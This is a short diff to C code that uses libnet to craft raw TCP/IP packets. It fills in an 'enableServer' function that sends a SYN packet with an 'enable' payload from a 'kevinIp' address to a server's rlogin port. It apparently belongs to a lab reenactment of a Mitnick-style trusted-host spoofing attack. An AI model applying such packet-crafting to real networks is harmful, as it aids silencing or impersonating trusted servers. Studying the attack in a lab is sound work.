@@ -14,13 +14,21 @@ void disableServer(libnet_t *l,u_long kevinIp, u_long serverIp)
 
     for(int i=0; i<10; i++)
     {   
-        printf("miao");
         sendPacket(l);
     }
                         
 }
 
-void enableServer(libnet_t *l,u_long serverIp)
+void enableServer(libnet_t *l,u_long kevinIp,u_long serverIp)
 {
-    
+    tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
+                                    libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
+                                    "enable", 7,
+                                    TH_SYN);
+
+    ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
+                                   NULL, (u_int32_t)7 );
+
+    sendPacket(l);
+
 }
